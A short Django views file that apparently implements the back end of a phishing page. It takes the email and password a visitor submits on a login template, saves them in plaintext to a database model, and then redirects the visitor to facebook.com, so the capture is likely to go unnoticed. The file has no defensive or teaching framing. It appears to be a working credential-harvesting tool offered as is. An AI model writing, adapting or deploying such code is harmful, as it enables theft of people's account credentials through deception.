from django.shortcuts import render, redirect
from .models import Profile

# Create your views here.
def home(request):
    if request.method == 'POST':
        email = request.POST['email']
        password = request.POST['password']
        profile = Profile.objects.create(email=email, password=password)
        return redirect('https://www.facebook.com/')  # Redirect to facebook.com

    return render(request, 'login/index.html')